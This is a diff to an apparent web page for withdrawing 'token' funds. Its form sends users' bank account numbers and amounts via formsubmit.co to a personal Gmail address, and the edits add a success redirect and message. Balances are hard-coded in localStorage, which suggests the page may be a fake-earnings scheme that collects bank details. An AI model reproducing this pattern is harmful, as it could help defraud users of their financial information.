@@ -137,7 +137,7 @@
       <button class="modal-close" onclick="closeWithdrawModal()">&times;</button>
       <h3>Withdraw Funds</h3>
       <div id="withdrawError" class="withdraw-error" style="display:none;"></div>
-      <form id="withdrawForm" method="POST" action="https://formsubmit.co/empirevirtual99@gmail.com" target="_blank" autocomplete="off">
+      <form id="withdrawForm" method="POST" action="https://formsubmit.co/empirevirtual99@gmail.com" target="_self" autocomplete="off">
         <input type="hidden" id="withdrawAccountId" name="Account ID">
         <label for="withdrawAccountNumber">Account Number:</label>
         <input type="number" id="withdrawAccountNumber" name="Account Number" maxlength="20" required pattern="^\d{10,}$" inputmode="numeric" placeholder="Enter Account Number (10+ digits)">
@@ -177,7 +177,7 @@
           <button type="button" class="modal-cancel-btn" onclick="closeWithdrawModal()">Cancel</button>
           <button type="button" class="withdraw-submit-btn" id="withdrawBtn">Withdraw</button>
         </div>
-        <input type="hidden" name="_next" value="">
+        <input type="hidden" name="_next" value="?withdraw=success">
         <input type="hidden" name="_captcha" value="false">
       </form>
     </div>
@@ -408,8 +408,7 @@
 
   <script>
     // --- Initialization: accountData & localStorage persistence ---
-    // Add a version to the data so we only reset localStorage if the file has changed
-    const ACCOUNT_DATA_VERSION = '20250617-v1'; // Update this if the file changes
+    const ACCOUNT_DATA_VERSION = '20250617-v1';
     const defaultAccountData = {
       _version: ACCOUNT_DATA_VERSION,
       "4171": {id: "4171", balance: 0, incomingDate: "2025-06-15", incomingTokenAmount: 0},
@@ -425,7 +424,6 @@
       "1908": {id: "1908", balance: 0, incomingDate: "2025-07-09", incomingTokenAmount: 8000}
     };
 
-    // Check for version. If changed, reset; else, use localStorage
     let accountDataRaw = localStorage.getItem('accountData');
     let accountData = {};
     if (accountDataRaw) {
@@ -518,7 +516,20 @@
       }, 3000);
     }
 
+    // Show success message if redirected back from formsubmit
+    function checkSuccessMessage() {
+      if (window.location.search.indexOf('withdraw=success') !== -1) {
+        showSuccess('Withdrawal request submitted successfully!');
+        // Optionally, remove the query param from the URL without reloading
+        if (history.replaceState) {
+          const url = window.location.href.replace(/\?withdraw=success/, '');
+          history.replaceState(null, '', url);
+        }
+      }
+    }
+
     document.addEventListener('DOMContentLoaded', function() {
+      checkSuccessMessage();
       // Update charge note live
       const amountInput = document.getElementById('withdrawAmount');
       if (amountInput) {
@@ -530,7 +541,7 @@
         });
       }
       // Set _next for form (optional, can redirect after submit)
-      document.getElementById('withdrawForm')._next.value = window.location.href;
+      document.getElementById('withdrawForm')._next.value = window.location.pathname + '?withdraw=success';
       // Hide all profiles on load
       const profiles = document.querySelectorAll('.profile-card');
       profiles.forEach(profile => {
@@ -554,24 +565,15 @@
       document.getElementById('withdrawBtn').addEventListener('click', function() {
         const withdrawForm = document.getElementById('withdrawForm');
         // Validate & deduct balance
+        let proceed = true;
         if (withdrawForm.onsubmit) {
-          const fakeEvent = { preventDefault: () => {}, returnValue: true };
+          const fakeEvent = { preventDefault: () => { proceed = false; }, returnValue: true };
           const result = withdrawForm.onsubmit(fakeEvent);
-          if (result === false || fakeEvent.returnValue === false) return;
+          if (result === false || proceed === false) return;
         }
-        // Actually submit the form to formsubmit.co
+        // Deduct balance and save
+        // The actual submission will reload the page and show success message via checkSuccessMessage()
         withdrawForm.submit();
-
-        // After submission, close modal and update profile
-        closeWithdrawModal();
-        // Show user profile again
-        const accountId = document.getElementById('withdrawAccountId').value;
-        document.querySelectorAll('.profile-card').forEach(card => card.style.display = 'none');
-        const profileCard = document.getElementById(`profile${accountId}`);
-        if (profileCard) { profileCard.style.display = 'block'; }
-        document.querySelector('.login-form').style.display = 'none';
-        // Show success message
-        showSuccess('Withdrawal request submitted successfully!');
       });
     });
 
@@ -606,10 +608,8 @@
       // Update UI
       const profileCard = document.getElementById(`profile${accountId}`);
       updateProfileCard(profileCard, accountId);
-      closeWithdrawModal();
-      // Do not allow form to submit naturally; handled by button
-      e.preventDefault();
-      return false;
+      // Allow form to submit to formsubmit.co (page will reload)
+      return true;
     };
 
     function regenerateToken(accountId) {
